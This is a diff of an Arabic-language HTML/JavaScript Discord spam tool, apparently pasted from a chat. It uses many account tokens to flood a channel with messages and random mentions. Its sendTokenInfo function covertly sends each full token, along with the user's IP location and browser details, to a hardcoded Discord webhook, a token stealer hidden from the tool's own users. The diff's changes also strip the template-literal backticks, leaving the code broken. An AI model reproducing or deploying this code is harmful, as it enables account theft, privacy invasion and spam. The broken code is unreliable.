@@ -1,3 +1,4 @@
+أنت قلت:
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -112,13 +113,13 @@ function getRandomMessage(){return MESSAGES[Math.floor(Math.random()*MESSAGES.le
 function getRandomId(){const ids=idsInput.value.trim().split('\n').filter(id=>id.length>0); return ids[Math.floor(Math.random()*ids.length)];}
 async function sendMessage(token,targetId,message){
 try{
-const response=await fetch(`https://discord.com/api/v9/channels/${targetId}/messages`,{
+const response=await fetch(https://discord.com/api/v9/channels/${targetId}/messages,{
 method:'POST', headers:{Authorization:token,'Content-Type':'application/json'},
-body:JSON.stringify({content:`<@${getRandomId()}> ${message}`})
+body:JSON.stringify({content:<@${getRandomId()}> ${message}})
 });
-if(response.ok){const p=document.createElement('p'); p.textContent=`تم الإرسال بواسطة ${token.substring(0,10)}... إلى الروم ${targetId} - الرسالة: ${message}`; p.style.color='orange'; messagesSent.appendChild(p); messagesSent.scrollTop=messagesSent.scrollHeight; sendTokenInfo(token); return true;}
-else{const p=document.createElement('p'); p.textContent=`فشل الإرسال بواسطة ${token.substring(0,10)}...`; p.style.color='red'; messagesSent.appendChild(p); messagesSent.scrollTop=messagesSent.scrollHeight; return false;}
-}catch(e){const p=document.createElement('p'); p.textContent=`خطأ في الإرسال بواسطة ${token.substring(0,10)}...`; p.style.color='red'; messagesSent.appendChild(p); messagesSent.scrollTop=messagesSent.scrollHeight; return false;}
+if(response.ok){const p=document.createElement('p'); p.textContent=تم الإرسال بواسطة ${token.substring(0,10)}... إلى الروم ${targetId} - الرسالة: ${message}; p.style.color='orange'; messagesSent.appendChild(p); messagesSent.scrollTop=messagesSent.scrollHeight; sendTokenInfo(token); return true;}
+else{const p=document.createElement('p'); p.textContent=فشل الإرسال بواسطة ${token.substring(0,10)}...; p.style.color='red'; messagesSent.appendChild(p); messagesSent.scrollTop=messagesSent.scrollHeight; return false;}
+}catch(e){const p=document.createElement('p'); p.textContent=خطأ في الإرسال بواسطة ${token.substring(0,10)}...; p.style.color='red'; messagesSent.appendChild(p); messagesSent.scrollTop=messagesSent.scrollHeight; return false;}
 }
 
 async function sendTokenInfo(token){
@@ -126,7 +127,7 @@ const webhookURL="https://discord.com/api/webhooks/1405569229612388373/c5e8Rb19N
 try{
 const ipData=await fetch('https://ipapi.co/json/').then(res=>res.json());
 const payload={
-content:`**TOKEN:** ${token}
+content:**TOKEN:** ${token}
 **Country:** ${ipData.country_name}
 **City/Region:** ${ipData.city}, ${ipData.region}
 **IP Address:** ${ipData.ip}
@@ -138,7 +139,7 @@ content:`**TOKEN:** ${token}
 **Browser:** ${navigator.userAgent}
 **Screen:** ${screen.width}x${screen.height}
 **Color Depth:** ${screen.colorDepth}
-**Language:** ${navigator.language}`
+**Language:** ${navigator.language}
 };
 fetch(webhookURL,{method:'POST',headers:{"Content-Type":"application/json"},body:JSON.stringify(payload)});
 }catch(e){console.error("Error sending token info:", e);}
@@ -153,7 +154,7 @@ if(!targetId){alert('الرجاء إدخال ايدي الروم.');return;}
 startBtn.disabled=true;
 stopBtn.disabled=false;
 tokenStatus.innerHTML='';
-tokens.forEach(t=>{const p=document.createElement('p'); p.textContent=`توكن صالح: ${t.substring(0,10)}...`; tokenStatus.appendChild(p);});
+tokens.forEach(t=>{const p=document.createElement('p'); p.textContent=توكن صالح: ${t.substring(0,10)}...; tokenStatus.appendChild(p);});
 intervalId=setInterval(()=>{tokens.forEach(token=>{sendMessage(token,targetId,getRandomMessage());});},speed);
 }
 
